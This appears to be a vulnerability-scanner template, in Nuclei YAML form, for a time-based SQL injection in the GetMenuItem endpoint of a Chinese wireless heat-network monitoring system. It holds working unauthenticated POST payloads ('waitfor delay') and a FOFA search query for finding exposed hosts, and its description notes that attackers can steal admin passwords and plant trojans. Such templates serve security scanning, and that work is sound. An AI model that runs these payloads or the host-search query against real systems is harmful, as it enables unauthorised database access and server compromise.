http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
          Content-Type: application/x-www-form-urlencoded

          name=1') waitfor delay '0:0:4'-- +
        - |
          POST /DataSrvs/UCCGSrv.asmx/GetMenuItem HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
          Content-Type: application/x-www-form-urlencoded

          name=1') waitfor delay '0:0:8'-- +
id: rewangwuxian-GetMenuItem-sql
info:
    author: Superhero
    description: |-
        fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
        热网无线监测系统 /DataSrvs/UCCGSrv.asmx/GetMenuItem 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 热网无线监测系统 GetMenuItem SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487275&idx=1&sn=c134372400af3922ff7db552556b2160&chksm=c267ba18f510330e6d48b24d1d1a3f6c11eccf22bb721ba521852e61acd140290897ea95d29b&token=2053938247&lang=zh_CN#rd
    severity: high
    tags: []
